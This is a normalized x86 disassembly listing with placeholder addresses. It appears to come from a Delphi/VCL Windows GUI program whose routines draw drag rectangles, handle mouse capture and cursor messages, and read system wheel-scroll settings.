mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_44be37
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4046e4
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44be3e
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_44be44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44bef3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0xc ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44a450
mov eax [ ebp - 0x8 ]
call sub_44bdcc
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44be44
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44befa
lea eax [ ebp - 0x8 ]
call sub_40442c
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44be44
pop ecx
sub_44bf00
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c039
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44bfe8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_446f84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44bfef
mov eax [ ebp - 0x10 ]
call sub_4036c0
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_44bdcc
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_446f98
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44bfef
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44be44
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c040
lea eax [ ebp - 0x14 ]
call sub_40442c
retn
sub_44c048
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44a798
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44a7c0
call sub_44c048
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44a798
call sub_44c048
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44a1c8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_44a6c0
mov edx eax
mov eax ebx
call sub_44a6e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_44a6e8
jmp r-xdata
sub_44c0d0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_44c048
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44c114
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44a6c0
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_44a6e8
sub_44c144
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_448484
mov edx eax
mov eax [ rw-data ]
call sub_44cca8
mov eax [ ebx + 0x14 ]
call sub_448484
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44c258
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44c1a4
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_44cca8
mov eax ebx
call sub_44c258
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44a6e8
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44a6e8
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44c0d0
push ebx
push sub_44c248
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_44aa74
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_44c220
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_446f84
test eax eax
jle r-xdata
push ebx
push sub_44c248
xor edx edx
mov eax ebx
call sub_44aa74
sub_44c258
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_44a28c
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_44a28c
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_44a2f8
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_44a2f8
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_421d14
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44c344
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44c344
pop ecx
mov eax ebx
call sub_44a6c0
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44a6c0
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44c344
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_44a6c0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_428b74
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_44c3d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_44a6c0
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44a244
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_44a6c0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44c344
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44c424
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_441704
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441704
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_44c4a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44a150
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_44a1fc
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_44a7a4
test eax eax
je r-xdata
mov eax esi
call sub_44a1c8
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44c248
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_44aa74
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44a7a4
mov edx [ ebx + 0x20 ]
call sub_44a6fc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_44c4a0
pop ecx
sub_44c520
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44a1ac
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_44a1ac
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_44a7a4
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_44c520
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44c248
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_44aa74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_44a3a8
mov eax edi
call sub_44a798
test eax eax
je r-xdata
mov eax edi
call sub_44a7a4
mov esi eax
mov eax esi
call sub_44a6c0
push eax
mov eax esi
call sub_44a1fc
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44a798
call sub_44a6c0
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_44a6c0
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44a6e8
mov eax esi
call sub_44a6c0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44a6e8
mov eax edi
call sub_44a7a4
call sub_44a738
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_44a1fc
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44a6e8
mov eax edi
call sub_44a798
call sub_44a738
mov bl 0x1
jmp r-xdata
sub_44c658
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44aa0c
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_414b3c
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44b200
test eax eax
je r-xdata
push ebp
call sub_44c4a0
pop ecx
push ebp
call sub_44c520
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44c424
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_44c6e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov ebx [ eax + 0x18 ]
mov eax [ esi ]
mov edi [ eax + 0x60 ]
mov eax [ edi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x60 ]
mov edx 0x2
call sub_44a28c
add eax ebx
mov edx [ esi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax edi
mov edx 0x1
call sub_44a28c
add eax ebx
mov edx [ esi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ esi ]
mov edx [ eax + 0x60 ]
mov eax [ esi ]
call sub_44c3d4
sub eax ebx
mov edx [ esi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ esi ]
mov [ edx + 0x50 ] eax
mov eax [ esi ]
mov edx [ eax + 0x60 ]
mov eax [ esi ]
call sub_44c3d4
sub eax ebx
mov edx [ esi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ esi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ esi ]
mov [ edx + 0x50 ] eax
mov edx [ esi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_44c774
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44cb4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_407494
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_44b200
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c1a4
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_407494
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b200
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4418a8
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44cb53
lea eax [ ebp - 0x48 ]
call sub_40442c
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448484
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4405c4
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_442a7c
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_40442c
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44c658
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_447018
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c258
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_407494
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_44c6e0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44c258
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_407494
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b200
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_441c84
jmp r-xdata
mov eax edi
call sub_45e89c
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44b200
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_441704
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_441d64
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_404480
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c144
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45ff34
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_448484
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
or ecx 0xffffffff
xor edx edx
call sub_442424
jmp r-xdata
sub_44cb5c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403690
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_44ccd0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44cbec
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44cca8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4036b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_44cc50
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_44cc80
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_4074fc
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_44cca8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cc1c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_44ccd0
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_44cc34
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_44cc50
pop ebx
retn
mov eax ebx
call sub_44cc80
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_44cd34
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ce9a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
